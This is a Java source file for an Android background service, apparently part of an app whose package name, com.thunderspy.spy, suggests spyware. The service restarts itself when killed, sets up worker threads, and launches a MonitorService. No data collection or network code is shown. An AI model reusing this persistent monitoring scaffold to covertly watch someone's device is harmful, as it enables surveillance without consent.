package com.thunderspy.spy;

import android.app.Application;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import com.thunderspy.spy.utils.ApplicationContextManager;
import com.thunderspy.spy.utils.ThreadPoolManager;
import com.thunderspy.spy.utils.Utils;
import com.thunderspy.spy.utils.etp.ETPThread;

public class WorkerService extends Service {
    private final int START_MODE = START_STICKY;
    private static Context context;

    public WorkerService() {}

    @Override
    public void onCreate() {
        ApplicationContextManager.initApplicationContext(this.getApplicationContext());
        initSetup();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            initSetup();
        } catch (Exception exp) {
            Utils.log("Worker Service has encountered error on start event: %s", exp.getMessage());
        }
        return START_MODE;
    }

    private void initSetup() {
        try {
            ThreadPoolManager.setupThreadPool();
            ETPThread.setupEtpThread();
            startService(new Intent(getApplicationContext(), MonitorService.class));
        } catch (Exception exp) {
            Utils.log("Initial setup for Worker Service could not be done: %s", exp.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public boolean onUnbind(Intent intent) {
        return false;
    }
    @Override
    public void onRebind(Intent intent) {

    }
    @Override
    public void onDestroy() {

    }
}
